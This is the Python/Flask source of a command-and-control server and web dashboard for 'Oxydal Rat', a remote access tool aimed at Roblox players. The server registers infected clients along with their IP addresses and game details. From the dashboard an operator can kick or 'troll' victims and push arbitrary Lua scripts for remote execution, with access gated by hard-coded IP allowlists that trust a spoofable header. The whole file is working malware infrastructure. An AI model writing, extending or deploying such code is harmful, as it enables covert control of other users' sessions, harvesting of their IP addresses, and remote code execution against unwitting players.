from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet
from datetime import datetime
import json
import os

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
HISTORY_FILE = "history_log.json"
connected_players = {}
pending_kicks = {}
pending_commands = {}
history_log = []

def load_history():
    global history_log
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history_log = json.load(f)
        except:
            history_log = []

def save_history():
    try:
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(history_log, f, ensure_ascii=False, indent=2)
    except:
        pass

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html><body style="background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%;">
      <h1>Accès refusé</h1>
      <p>Ton IP : <b>{detected}</b></p>
    </body></html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

def add_history(event_type, username, details=""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    history_log.insert(0, {
        "time": timestamp,
        "type": event_type,
        "username": username,
        "details": details
    })
    if len(history_log) > 100:
        history_log.pop()
    save_history()
    socketio.emit("history_update", {"history": history_log[:50]})

HTML = """<!DOCTYPE html>
<html lang="en" class="dark">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat — Wave Theme</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
<style>
    :root {
        --bg: #0f172a;
        --card: #1e293b;
        --border: #334155;
        --primary: #06b6d4;
        --primary-hover: #0891b2;
        --text: #e2e8f0;
        --text-muted: #94a3b8;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; display: flex; }
    .header { position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between; }
    .logo { display:flex;align-items:center;gap:12px;font-weight:700;font-size:1.5rem; }
    .logo svg { width:40px;height:40px;fill:var(--primary); }
    .stats { font-size:1.1rem;color:var(--text-muted); }
    .stats b { color:var(--primary);font-weight:600; }
    .main { flex:1;margin-top:70px;display:flex; }
    .sidebar { width:260px;background:rgba(30,41,59,0.95);border-right:1px solid var(--border);padding:1.5rem 0; }
    .nav-item { padding:1rem 2rem;cursor:pointer;transition:all 0.3s;color:var(--text-muted);font-weight:500; }
    .nav-item:hover { background:rgba(6,182,212,0.15);color:var(--primary); }
    .nav-item.active { background:rgba(6,182,212,0.25);color:var(--primary);border-left:4px solid var(--primary); }
    .content { flex:1;padding:2rem;overflow-y:auto; }
    .grid { display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:1.5rem; }
    .card { background:var(--card);border:1px solid var(--border);border-radius:16px;padding:1.5rem;transition:all 0.4s;position:relative;overflow:hidden; }
    .card:hover { transform:translateY(-10px);box-shadow:0 25px 50px rgba(6,182,212,0.25);border-color:var(--primary); }
    .card::before { content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,transparent,var(--primary),transparent);opacity:0;transition:0.4s; }
    .card:hover::before { opacity:1; }
    .status { display:flex;align-items:center;gap:8px;margin-bottom:12px; }
    .dot { width:10px;height:10px;border-radius:50%;background:#ef4444;box-shadow:0 0 10px #ef444430; }
    .dot.online { background:var(--primary);box-shadow:0 0 20px var(--primary);animation:pulse 2s infinite; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
    .name { font-size:1.3rem;font-weight:600;margin-bottom:8px; }
    .name a { color:var(--primary);text-decoration:none; }
    .name a:hover { text-decoration:underline; }
    .info { font-size:0.9rem;color:var(--text-muted);line-height:1.5;margin-bottom:16px; }
    .category { font-weight:bold;color:var(--primary);margin:16px 0 8px;font-size:0.95rem; }
    .btn-grid { display:grid;grid-template-columns:repeat(3,1fr);gap:8px; }
    .btn { 
        padding:10px;border:none;border-radius:10px;font-weight:600;font-size:0.8rem;
        cursor:pointer;transition:all 0.3s;color:white;
        background: linear-gradient(135deg, #06b6d4, #0891b2);
        box-shadow: 0 4px 15px rgba(6,182,212,0.3);
    }
    .btn:hover { 
        transform:translateY(-4px); 
        box-shadow:0 10px 25px rgba(6,182,212,0.5);
        background: linear-gradient(135deg, #0891b2, #06b6d4);
    }
    .btn.kick { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow:0 4px 15px rgba(239,68,68,0.4); }
    .btn.kick:hover { background: linear-gradient(135deg, #dc2626, #ef4444); box-shadow:0 10px 25px rgba(239,68,68,0.6); }
    .btn.undo { background: #475569; }
    .btn.undo:hover { background: #5b6b7d; }
    .modal { display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:2000;align-items:center;justify-content:center; }
    .modal.active { display:flex; }
    .modal-content { background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:520px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,0.5); }
    .modal-content h2 { color:var(--primary);margin-bottom:1rem;text-align:center;font-size:1.6rem; }
    input, textarea { width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace; }
    .modal-buttons { display:flex;gap:1rem; }
    .modal-btn { flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;transition:all 0.3s; }
    .confirm { background:var(--primary);color:white; }
    .confirm:hover { background:var(--primary-hover);transform:translateY(-3px);box-shadow:0 10px 25px rgba(6,182,212,0.5); }
    .cancel { background:#475569;color:white; }
    .toast-container { position:fixed;bottom:20px;right:20px;z-index:9999; }
    .toast { background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.6);animation:slideIn 0.4s; }
    @keyframes slideIn { from{transform:translateX(100%)} to{transform:translateX(0)} }
    .history-item { background:var(--card);padding:1rem;border-radius:12px;margin-bottom:1rem;border-left:4px solid var(--primary); }
</style>
</head>
<body>

<div class="header">
    <div class="logo">
        <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
        <div>Oxydal Rat</div>
    </div>
    <div class="stats">Players online: <b id="stats">0</b></div>
</div>

<div class="main">
    <div class="sidebar">
        <div class="nav-item active" onclick="switchTab('players')">Players</div>
        <div class="nav-item" onclick="switchTab('history')">History</div>
    </div>

    <div class="content">
        <div id="players-tab" class="tab active">
            <div class="grid" id="players"></div>
        </div>
        <div id="history-tab" class="tab" style="display:none;">
            <div id="history"></div>
        </div>
    </div>
</div>

<!-- Modals -->
<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelKick">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
<div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelSound">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel" id="cancelText">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
<div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel" id="cancelLua">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
<div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel" id="cancelImport">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;

function switchTab(tab) {
    document.querySelectorAll('.tab').forEach(t => t.style.display = 'none');
    document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
    document.getElementById(tab + '-tab').style.display = 'block';
    event.target.classList.add('active');
}

function toast(msg, type = "info") {
    const t = document.createElement("div");
    t.className = "toast";
    t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 5000);
}

function openKickModal(id) { currentKickId = id; document.getElementById("kickModal").classList.add("active"); document.getElementById("kickReason").focus(); }
function openPlaySoundModal(id) { currentSoundId = id; document.getElementById("playSoundModal").classList.add("active"); document.getElementById("soundAssetId").focus(); }
function openTextScreenModal(id) { currentTextId = id; document.getElementById("textScreenModal").classList.add("active"); document.getElementById("screenText").focus(); }
function openLuaExecModal(id) { currentLuaId = id; document.getElementById("luaExecModal").classList.add("active"); document.getElementById("luaScript").focus(); }
function openImportFileModal(id) { currentImportId = id; document.getElementById("importFileModal").classList.add("active"); }

function closeModal(modalId) { document.getElementById(modalId).classList.remove("active"); }
document.querySelectorAll('.cancel').forEach(b => b.onclick = () => closeModal(b.closest('.modal').id));

function sendTroll(id, cmd, param = null) {
    const body = {userid: id, cmd: cmd};
    if (param !== null) {
        if (cmd === "playsound") body.assetId = param;
        else if (cmd === "textscreen") body.text = param;
        else if (cmd === "luaexec") body.script = param;
    }
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)});
    toast(cmd.toUpperCase() + " sent");
}

document.getElementById("confirmKick").onclick = () => {
    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason})});
    toast("KICK sent", "danger");
    closeModal("kickModal");
};
document.getElementById("confirmSound").onclick = () => {
    const asset = document.getElementById("soundAssetId").value.trim();
    if (!asset) return toast("Enter Asset ID", "danger");
    sendTroll(currentSoundId, "playsound", asset);
    closeModal("playSoundModal");
};
document.getElementById("confirmText").onclick = () => {
    const text = document.getElementById("screenText").value.trim();
    if (!text) return toast("Enter text", "danger");
    sendTroll(currentTextId, "textscreen", text);
    closeModal("textScreenModal");
};
document.getElementById("confirmLua").onclick = () => {
    const script = document.getElementById("luaScript").value.trim();
    if (!script) return toast("Enter Lua code", "danger");
    sendTroll(currentLuaId, "luaexec", script);
    closeModal("luaExecModal");
};
document.getElementById("confirmImport").onclick = () => {
    const file = document.getElementById("luaFileInput").files[0];
    if (!file) return toast("Select a file", "danger");
    const reader = new FileReader();
    reader.onload = e => { sendTroll(currentImportId, "luaexec", e.target.result); closeModal("importFileModal"); document.getElementById("luaFileInput").value = ""; };
    reader.readAsText(file);
};

function render(data) {
    document.getElementById("stats").innerText = data.online;
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div");
            card.className = "card";
            card.id = `card_${id}`;
            grid.appendChild(card);
        }
        card.innerHTML = `
            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId}</div>

            <div class="category">TROLLS</div>
            <div class="btn-grid">
                <button class="btn kick" onclick="openKickModal('${id}')">KICK</button>
                <button class="btn" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="btn" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="btn" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="btn" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                <button class="btn" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
            </div>

            <div class="category">UNDO</div>
            <div class="btn-grid">
                <button class="btn undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="btn undo" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="btn undo" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                <button class="btn undo" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
                <button class="btn undo" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                <button class="btn undo" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
            </div>

            <div class="category">LUA EXEC</div>
            <div class="btn-grid" style="grid-template-columns:1fr 1fr">
                <button class="btn" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
                <button class="btn" onclick="openLuaExecModal('${id}')">EXECUTOR</button>
            </div>
        `;
    });

    document.querySelectorAll('.card').forEach(c => {
        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
    });
}

function renderHistory(data) {
    const div = document.getElementById("history");
    div.innerHTML = data.history.map(h => `
        <div class="history-item">
            <strong>[${h.time}] ${h.username}</strong><br>
            <span style="color:#94a3b8">${h.details}</span>
        </div>
    `).join('');
}

socket.on("update", render);
socket.on("history_update", renderHistory);
socket.on("kick_notice", d => toast(d.username + " → " + d.reason, "danger"));
fetch("/get_history").then(r => r.json()).then(renderHistory);
</script>
</body>
</html>"""

# === Routes identiques ===
@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/get_history")
def get_history():
    return jsonify({"history": history_log[:50]})

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                username = d.get("username", "Unknown")
                connected_players[uid] = {
                    "username": username, "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"), "last": now, "online": True,
                    "game": d.get("game", "Unknown"), "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
                add_history("connect", username, f"Connected from {d.get('game', 'Unknown')}")
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            result = {"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd}
            if isinstance(cmd, dict):
                if "assetId" in cmd: result["assetId"] = cmd["assetId"]
                if "text" in cmd: result["text"] = cmd["text"]
                if "script" in cmd: result["script"] = cmd["script"]
            return jsonify(result)
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    add_history("action", name, f"KICKED: {reason}")
    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        cmd_data = {"cmd": cmd}
        details = f"{cmd.upper()}"
        if "assetId" in data:
            cmd_data["assetId"] = data["assetId"]
            details += f" (Asset: {data['assetId']})"
        elif "text" in data:
            cmd_data["text"] = data["text"]
            details += f" (Text: {data['text']})"
        elif "script" in data:
            cmd_data["script"] = data["script"]
            details += f" (Script: {len(data['script'])} chars)"
        pending_commands[uid] = cmd_data
        name = connected_players.get(uid, {}).get("username", "Unknown")
        add_history("action", name, details)
        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in list(connected_players.items()):
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                was_online = p["online"]
                p["online"] = now - p["last"] < 15
                if was_online and not p["online"]:
                    add_history("disconnect", p["username"], "Connection lost")
                if p["online"]: online += 1
        for uid in to_remove:
            username = connected_players.pop(uid, {}).get("username", "Unknown")
            add_history("disconnect", username, "Disconnected")
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    load_history()
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
